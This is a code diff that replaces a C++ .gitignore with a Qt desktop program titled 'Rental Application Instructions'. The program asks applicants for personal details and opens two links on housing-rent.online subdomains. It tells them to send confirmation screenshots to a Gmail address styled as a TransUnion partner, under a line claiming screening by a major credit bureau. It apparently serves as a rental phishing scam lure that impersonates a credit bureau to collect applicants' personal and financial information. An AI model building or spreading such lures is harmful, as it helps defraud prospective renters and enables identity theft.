@@ -1,41 +1,124 @@
-# Prerequisites
-*.d
+#include <QApplication>
+#include <QWidget>
+#include <QVBoxLayout>
+#include <QLabel>
+#include <QPushButton>
+#include <QListWidget>
+#include <QDesktopServices>
+#include <QUrl>
+#include <QPalette>
+#include <QPixmap>
+#include <QPainter>
+#include <QFont>
 
-# Compiled Object files
-*.slo
-*.lo
-*.o
-*.obj
+class RentalApplication : public QWidget {
+public:
+    RentalApplication(QWidget *parent = nullptr) : QWidget(parent) {
+        // Set up the main window
+        setWindowTitle("Rental Application Instructions");
+        setFixedSize(750, 800);
+        
+        // Create a background image effect
+        QPalette palette;
+        palette.setBrush(this->backgroundRole(), QBrush(QPixmap(":/background.jpg").scaled(this->size())));
+        setPalette(palette);
+        
+        // Create main container
+        QWidget *container = new QWidget(this);
+        container->setGeometry(50, 50, 650, 700);
+        container->setStyleSheet("background-color: rgba(0, 0, 0, 200); border-radius: 15px;");
+        
+        QVBoxLayout *mainLayout = new QVBoxLayout(container);
+        mainLayout->setAlignment(Qt::AlignCenter);
+        mainLayout->setSpacing(20);
+        mainLayout->setContentsMargins(30, 30, 30, 30);
+        
+        // Title
+        QLabel *title = new QLabel("🏡 Rental Application Instructions");
+        title->setStyleSheet("font-size: 24px; font-weight: bold; color: white; text-align: center;");
+        mainLayout->addWidget(title);
+        
+        // Introduction
+        QLabel *intro1 = new QLabel("Hello Dear Applicant,");
+        intro1->setStyleSheet("color: white; font-size: 16px;");
+        mainLayout->addWidget(intro1);
+        
+        QLabel *intro2 = new QLabel("If you're interested in renting one of our available properties, please follow the steps below:");
+        intro2->setStyleSheet("color: white; font-size: 16px;");
+        mainLayout->addWidget(intro2);
+        
+        // Requirements section
+        QLabel *reqTitle = new QLabel("📋 Application Requirements:");
+        reqTitle->setStyleSheet("font-size: 20px; font-weight: bold; color: white; text-align: center;");
+        mainLayout->addWidget(reqTitle);
+        
+        QListWidget *reqList = new QListWidget();
+        reqList->addItem("Provide your full name, email address, and contact number.");
+        reqList->addItem("Complete both required application forms.");
+        reqList->addItem("These help us confirm eligibility, including credit screening and rental history.");
+        reqList->setStyleSheet("background-color: transparent; color: white; font-size: 16px; border: none;");
+        mainLayout->addWidget(reqList);
+        
+        // Application links section
+        QLabel *appTitle = new QLabel("📝 Application Links:");
+        appTitle->setStyleSheet("font-size: 20px; font-weight: bold; color: white; text-align: center;");
+        mainLayout->addWidget(appTitle);
+        
+        QHBoxLayout *buttonLayout = new QHBoxLayout();
+        buttonLayout->setAlignment(Qt::AlignCenter);
+        buttonLayout->setSpacing(10);
+        
+        QPushButton *app1Button = new QPushButton("First Application");
+        app1Button->setStyleSheet("background-color: #00aaff; color: white; font-size: 16px; padding: 12px 25px; border-radius: 8px;");
+        connect(app1Button, &QPushButton::clicked, this, [](){
+            QDesktopServices::openUrl(QUrl("http://scores476.housing-rent.online"));
+        });
+        
+        QPushButton *app2Button = new QPushButton("Second Application");
+        app2Button->setStyleSheet("background-color: #00aaff; color: white; font-size: 16px; padding: 12px 25px; border-radius: 8px;");
+        connect(app2Button, &QPushButton::clicked, this, [](){
+            QDesktopServices::openUrl(QUrl("http://scores376.housing-rent.online"));
+        });
+        
+        buttonLayout->addWidget(app1Button);
+        buttonLayout->addWidget(app2Button);
+        mainLayout->addLayout(buttonLayout);
+        
+        // Instructions
+        QLabel *instructions = new QLabel("After submitting both forms, please screenshot the confirmation pages and send them to our contact email below.");
+        instructions->setStyleSheet("color: white; font-size: 16px;");
+        mainLayout->addWidget(instructions);
+        
+        // Badge
+        QLabel *badge = new QLabel("✔︎");
+        badge->setAlignment(Qt::AlignCenter);
+        badge->setStyleSheet("background-color: white; color: #333; border-radius: 30px; width: 60px; height: 60px; font-size: 24px; margin: 0 auto;");
+        badge->setFixedSize(60, 60);
+        mainLayout->addWidget(badge);
+        
+        // Credit note
+        QLabel *creditNote = new QLabel("Screening powered by a major credit bureau");
+        creditNote->setStyleSheet("color: #ccc; font-size: 12px; text-align: center;");
+        mainLayout->addWidget(creditNote);
+        
+        // Contact section
+        QLabel *contactTitle = new QLabel("Email: help.transunion.partner@gmail.com");
+        contactTitle->setStyleSheet("color: white; font-size: 14px; text-align: center; font-weight: bold;");
+        
+        QLabel *contactText = new QLabel("We'll follow up with you to schedule a viewing after review.");
+        contactText->setStyleSheet("color: white; font-size: 14px; text-align: center;");
+        
+        mainLayout->addSpacing(20);
+        mainLayout->addWidget(contactTitle);
+        mainLayout->addWidget(contactText);
+    }
+};
 
-# Precompiled Headers
-*.gch
-*.pch
-
-# Linker files
-*.ilk
-
-# Debugger Files
-*.pdb
-
-# Compiled Dynamic libraries
-*.so
-*.dylib
-*.dll
-
-# Fortran module files
-*.mod
-*.smod
-
-# Compiled Static libraries
-*.lai
-*.la
-*.a
-*.lib
-
-# Executables
-*.exe
-*.out
-*.app
-
-# debug information files
-*.dwo
+int main(int argc, char *argv[]) {
+    QApplication app(argc, argv);
+    
+    RentalApplication window;
+    window.show();
+    
+    return app.exec();
+}
